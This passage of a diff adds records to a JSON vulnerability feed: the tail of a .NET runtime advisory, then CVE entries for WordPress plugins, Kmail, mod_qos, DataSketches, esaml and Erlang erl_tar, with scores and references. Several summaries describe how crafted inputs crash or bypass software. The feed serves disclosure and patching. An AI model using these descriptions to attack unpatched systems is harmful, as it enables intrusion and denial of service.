10.0.15\n[Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n[Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 10.0.0-preview.1.25120.3, <= 10.0.14 | 10.0.15\n\n### .NET 11.0 - affected runtime packages\n\nPackage | Affected version | Patched version\n| --- | ---\n[Microsoft.AspNetCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-arm64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-arm64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-musl-x64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.linux-x64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-arm64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.osx-x64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n[Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86) | >= 11.0.0-preview.1.26104.118, <= 11.0.0-rc.3.26522.148 | 11.0.0\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nCheck the deployed runtime and application package versions against the affected ranges above. Self-contained applications include their own runtime; updating a machine-wide runtime does not replace it.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\nInstall the applicable runtime or update each independently referenced package to the fixed version above. Restart applications. Rebuild and redeploy self-contained applications; updating a machine-wide runtime does not replace their embedded runtime. An SDK update alone does not update an application's standalone package references.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the [MSRC Researcher Portal](https://msrc.microsoft.com/report/vulnerability/new). Further information can be found in the MSRC [Report an Issue FAQ](https://www.microsoft.com/msrc/faqs-report-an-issue).\n\nSecurity reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.\n\n### Disclaimer\n\nThe information provided in this advisory is provided \"as is\" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.\n\n### External Links\n\n[CVE-2026-109476](https://www.cve.org/CVERecord?id=CVE-2026-109476)\n\n### Acknowledgements\n\n- Raffaello Tamagnini\n\n### Revisions\n\nV1.0 (November 10, 2026): Advisory published.",
+      "cvssScore": 6.1,
+      "severity": "Medium",
+      "published": "2026-11-10",
+      "modified": "2026-11-10",
+      "cwe": {
+        "cwe_id": "CWE-116",
+        "name": "Improper Encoding or Escaping of Output"
+      },
+      "references": [
+        "https://github.com/dotnet/aspnetcore/security/advisories/GHSA-xhj5-c3g8-pfj8",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-109476",
+        "https://github.com/dotnet/announcements/issues/508",
+        "https://github.com/dotnet/aspnetcore/commit/1fa5639647ddd2061bafe2ccf60bdc1c345b0b34",
+        "https://github.com/dotnet/aspnetcore/commit/7ce5a6b05d4d6694bb688bf7053ebb594c00a8e5"
+      ],
+      "vulnerableProducts": [
+        "Microsoft.AspNetCore.App.Runtime.linux-arm nuget",
+        "Microsoft.AspNetCore.App.Runtime.linux-arm64 nuget",
+        "Microsoft.AspNetCore.App.Runtime.linux-musl-arm nuget",
+        "Microsoft.AspNetCore.App.Runtime.linux-musl-arm64 nuget",
+        "Microsoft.AspNetCore.App.Runtime.linux-musl-x64 nuget"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0481",
+      "summary": "Buffer overflow in KDE Kmail allows a remote attacker to cause a denial of service via an attachment with a long file name.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-06-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://securityfocus.com/templates/archive.pike?list=82&date=2000-06-22&msg=00060200422401.01667%40lez",
+        "http://www.securityfocus.com/bid/1380",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4993",
+        "http://securityfocus.com/templates/archive.pike?list=82&date=2000-06-22&msg=00060200422401.01667%40lez",
+        "http://www.securityfocus.com/bid/1380"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1321",
+      "summary": "Buffer overflow in Avant Browser 8.02 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a long URL in an HTTP request.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=106150462504484&w=2",
+        "http://www.securityfocus.com/bid/8471",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/12974",
+        "http://marc.info/?l=bugtraq&m=106150462504484&w=2",
+        "http://www.securityfocus.com/bid/8471"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1322",
+      "summary": "Multiple stack-based buffer overflows in Atrium MERCUR IMAPD in MERCUR Mailserver before 4.2.15.0 allow remote attackers to execute arbitrary code via a long (1) EXAMINE, (2) DELETE, (3) SUBSCRIBE, (4) RENAME, (5) UNSUBSCRIBE, (6) LIST, (7) LSUB, (8) STATUS, (9) LOGIN, (10) CREATE, or (11) SELECT command.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2003-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.iss.net/security_center/static/12203.php",
+        "http://www.securityfocus.com/archive/1/324136",
+        "http://www.securityfocus.com/bid/7842",
+        "http://www.iss.net/security_center/static/12203.php",
+        "http://www.securityfocus.com/archive/1/324136"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1135",
+      "summary": "modsecurity.php 1.10 and earlier, in phpWebSite 0.8.2 and earlier, allows remote attackers to execute arbitrary PHP source code via an inc_prefix parameter that points to the malicious code.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-10-04",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=103279980906880&w=2",
+        "http://phpwebsite.appstate.edu/article.php?sid=400",
+        "http://www.iss.net/security_center/static/10164.php",
+        "http://www.osvdb.org/3848",
+        "http://www.securityfocus.com/bid/5779"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-111847",
+      "summary": "Missing Authorization vulnerability in Kings Plugins MarketKing marketking-multivendor-marketplace-for-woocommerce allows Exploiting Incorrectly Configured Access Control Security Levels.This issue affects MarketKing: from n/a through 2.1.72.",
+      "cvssScore": 4.2,
+      "severity": "Medium",
+      "published": "2026-10-22",
+      "modified": "2026-10-22",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-111847",
+        "https://patchstack.com/database/wordpress/plugin/marketking-multivendor-marketplace-for-woocommerce/vulnerability/wordpress-marketking-plugin-2-1-72-broken-access-control-vulnerability?_s_id=cve"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-112826",
+      "summary": "Missing Authorization vulnerability in eLightUp Falcon – WordPress Optimizations & Tweaks falcon allows Exploiting Incorrectly Configured Access Control Security Levels.This issue affects Falcon – WordPress Optimizations & Tweaks: from n/a through 2.12.0.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-10-22",
+      "modified": "2026-10-22",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-112826",
+        "https://patchstack.com/database/wordpress/plugin/falcon/vulnerability/wordpress-falcon-wordpress-optimizations-tweaks-plugin-2-12-0-broken-access-control-vulnerability?_s_id=cve"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-114460",
+      "summary": "A flaw was found in mod_qos. An off-by-one pointer calculation error occurs when merging request body parameters with an existing URL query, which truncates the query string during security evaluation while leaving the actual request unchanged. An unauthenticated remote attacker could exploit this vulnerability by submitting a crafted request that conceals prohibited values from inspection, resulting in a bypass of configured security rules.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-10-22",
+      "modified": "2026-10-22",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-114460",
+        "https://access.redhat.com/security/cve/CVE-2026-114460",
+        "https://bugzilla.redhat.com/show_bug.cgi?id=2558401"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-103634",
+      "summary": "Out-of-bounds read and write in the Count-Min sketch deserialization of Apache DataSketches C++ (repo: datasketches-cpp).\n\ncount_min_sketch::deserialize() did not include the preamble in its input size check, so a truncated sketch could cause a read of up to 16 bytes past the end of the input. In addition, the table size was computed from the serialized number of buckets and number of hash functions in 32-bit arithmetic. A crafted sketch could make it wrap to zero, so that the sketch deserialized with an empty table, and later updates and estimate queries read and wrote outside the heap allocation. This can corrupt heap memory, causing a crash and potentially enabling further exploitation.\n\nThis issue affects Apache DataSketches C++: from 4.1.0 before 5.3.0. Only applications that deserialize Count-Min sketches from untrusted sources are affected.\n\nUsers are recommended to upgrade to version 5.3.0, which fixes this issue.",
+      "cvssScore": null,
+      "severity": "Unknown",
+      "published": "2026-10-22",
+      "modified": "2026-10-22",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-103634",
+        "https://github.com/apache/datasketches-cpp/releases/tag/5.3.0",
+        "https://lists.apache.org/thread/rkx9oh06g5cjc6vmmpqloxwfz0gzz01h",
+        "http://www.openwall.com/lists/oss-security/2026/10/10/4"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-111830",
+      "summary": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in WP Mailster WP Mailster wp-mailster allows Stored XSS.This issue affects WP Mailster: from n/a through 1.9.1.0.",
+      "cvssScore": 6,
+      "severity": "Medium",
+      "published": "2026-10-22",
+      "modified": "2026-10-22",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-111830",
+        "https://patchstack.com/database/wordpress/plugin/wp-mailster/vulnerability/wordpress-wp-mailster-plugin-1-9-1-0-cross-site-scripting-xss-vulnerability?_s_id=cve"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-110894",
+      "summary": "Missing Authorization vulnerability in Brainstorm Force SureDash suredash allows Exploiting Incorrectly Configured Access Control Security Levels.This issue affects SureDash: from n/a through 1.12.2.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-10-22",
+      "modified": "2026-10-22",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-110894",
+        "https://patchstack.com/database/wordpress/plugin/suredash/vulnerability/wordpress-suredash-plugin-1-12-2-broken-access-control-vulnerability?_s_id=cve"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-105270",
+      "summary": "Allocation of Resources Without Limits or Throttling vulnerability in esaml_binding in dropbox esaml allows an unauthenticated attacker to exhaust the Erlang VM atom table and crash the node via a crafted SAMLResponse.\n\nesaml_binding:decode_response/2 parses the decoded SAMLResponse with xmerl_scan:string/2, which interns every element name, attribute name, and namespace prefix it reads as a permanent atom. The SAML consume (ACS) and single-logout endpoints call it on unauthenticated requests before any signature check, so one well-formed document with thousands of distinct names mints thousands of atoms while staying inside the 128 KB request body limit. Atoms are never reclaimed and the VM caps the atom table at about one million entries, so a few dozen requests abort the node.\n\nThis issue affects esaml: from 0.1.0 onward.",
+      "cvssScore": null,
+      "severity": "High",
+      "published": "2026-10-22",
+      "modified": "2026-10-22",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-105270",
+        "https://github.com/arekinath/esaml/commit/deeb84378d5c82153b470e99d24f77c38afca14a",
+        "https://github.com/dropbox/esaml/commit/deeb84378d5c82153b470e99d24f77c38afca14a",
+        "https://github.com/handnot2/esaml/commit/deeb84378d5c82153b470e99d24f77c38afca14a",
+        "https://cna.erlef.org/cves/CVE-2026-105270.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-114175",
+      "summary": "Missing Authorization vulnerability in DigitalME eRoom eroom-zoom-meetings-webinar allows Exploiting Incorrectly Configured Access Control Security Levels.This issue affects eRoom: from n/a through 1.7.1.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-10-22",
+      "modified": "2026-10-22",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-114175",
+        "https://patchstack.com/database/wordpress/plugin/eroom-zoom-meetings-webinar/vulnerability/wordpress-eroom-plugin-1-7-1-settings-change-vulnerability?_s_id=cve"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-112242",
+      "summary": "Incorrect Privilege Assignment vulnerability in Cozmoslabs Profile Builder profile-builder allows Privilege Escalation.This issue affects Profile Builder: from n/a through 4.0.4.",
+      "cvssScore": 8.8,
+      "severity": "High",
+      "published": "2026-10-22",
+      "modified": null,
+      "cwe": "CWE-266",
+      "references": [
+        "https://patchstack.com/database/wordpress/plugin/profile-builder/vulnerability/wordpress-profile-builder-plugin-4-0-4-privilege-escalation-vulnerability?_s_id=cve"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-112843",
+      "summary": "Missing Authorization vulnerability in WP Chill Strong Testimonials strong-testimonials allows Exploiting Incorrectly Configured Access Control Security Levels.This issue affects Strong Testimonials: from n/a through 3.3.14.",
+      "cvssScore": 4.2,
+      "severity": "Medium",
+      "published": "2026-10-22",
+      "modified": "2026-10-22",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-112843",
+        "https://patchstack.com/database/wordpress/plugin/strong-testimonials/vulnerability/wordpress-strong-testimonials-plugin-3-3-14-broken-access-control-vulnerability?_s_id=cve"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2025-66533",
+      "summary": "Improper Control of Generation of Code ('Code Injection') vulnerability in StellarWP GiveWP give allows Code Injection.This issue affects GiveWP: from n/a through <= 4.13.1.",
+      "cvssScore": 6.1,
+      "severity": "Medium",
+      "published": "2025-12-09",
+      "modified": "2026-10-22",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-66533",
+        "https://patchstack.com/database/Wordpress/Plugin/give/vulnerability/wordpress-givewp-plugin-4-13-1-arbitrary-shortocde-execution-vulnerability?_s_id=cve",
+        "https://vdp.patchstack.com/database/Wordpress/Plugin/give/vulnerability/wordpress-givewp-plugin-4-13-1-arbitrary-shortocde-execution-vulnerability?_s_id=cve"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-96596",
+      "summary": "Loop with Unreachable Exit Condition ('Infinite Loop') vulnerability in Erlang OTP stdlib (erl_tar module), hexpm hex_core (hex_erl_tar module), hexpm hex (mix_hex_erl_tar module) and erlang rebar3 (r3_hex_erl_tar module) allows an attacker who supplies a tar archive to cause a denial of service via a crafted GNU sparse member.\n\nWhen erl_tar:extract/1,2 writes a member to disk, erl_tar:stream_to_file_loop/3 reads it in chunks of 65536 bytes by default. For a GNU sparse member whose sparse map ends before its real size, erl_tar:do_sparse_read/3 matches its trailing-hole clause before its zero-length clause. After the chunk is used up, the trailing-hole clause reads zero bytes, does not advance the position, and recurses forever. A 2048-byte archive keeps the extracting process and one scheduler busy until the process is killed. The {max_size, N} option prevents this only when N is below the real size of the member. Extraction with the memory option is not affected.\n\nhex_core ships its own copy of erl_tar as hex_erl_tar, and Hex and rebar3 ship hex_core with prefixed module names (mix_hex_erl_tar and r3_hex_erl_tar). These copies contain the same code and do not call stdlib's erl_tar, so they are affected on any OTP version. OTP 28 is not affected, but an application running on OTP 28 is affected if it extracts archives through an affected version of hex_core, Hex or rebar3.\n\nThis issue affects OTP from OTP 29.0 before OTP 29.1.2, corresponding to rebar3 from 3.27.1 before 3.28.0, and stdlib from 8.0 before 8.1.1, and hex from 2.4.2 before 2.5.3; hex_core: from 0.14.0 before 0.20.1.",
+      "cvssScore": null,
+      "severity": "Unknown",
+      "published": "2026-10-14",
+      "modified": null,
+      "cwe": "CWE-835",
+      "references": [
+        "https://cna.erlef.org/cves/CVE-2026-96596.html",
+        "https://github.com/erlang/otp/commit/3086307f311b78b38644a7787a3aca6a3f95a9d5",
+        "https://github.com/erlang/otp/commit/fbf2c7194f6fce4b7b66dc0bcaa4f6b4b85e088f",
+        "https://github.com/erlang/otp/security/advisories/GHSA-phm5-m6cj-5382",
+        "https://github.com/erlang/rebar3/commit/23dbdb5d1f87f56902aef296c88a20049cd0c6e4"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0644",
+      "summary": "Kdbg 1.1.0 through 1.2.8 does not check permissions of the .kdbgrc file, which allows local users to execute arbitrary commands.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2003-09-07",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://lists.debian.org/debian-devel-changes/2003/09/msg00767.html",
+        "http://lists.kde.org/?l=kde-announce&m=106296509815092&w=2",
+        "http://www.redhat.com/support/errata/RHSA-2005-416.html",
+        "http://lists.debian.org/debian-devel-changes/2003/09/msg00767.html",
+        "http://lists.kde.org/?l=kde-announce&m=106296509815092&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0301",
+      "summary": "Buffer overflow in Analog before 4.16 allows remote attackers to execute arbitrary commands by using the ALIAS command to construct large strings.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2001-05-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0264.html",
+        "http://archives.neohapsis.com/archives/linux/redhat/2001-q1/0056.html",
+        "http://www.analog.cx/security2.html",
+        "http://www.debian.org/security/2001/dsa-033",
+        "http://www.osvdb.org/1762"
       ],
       "vulnerableProducts": [],
       "isExploited": false
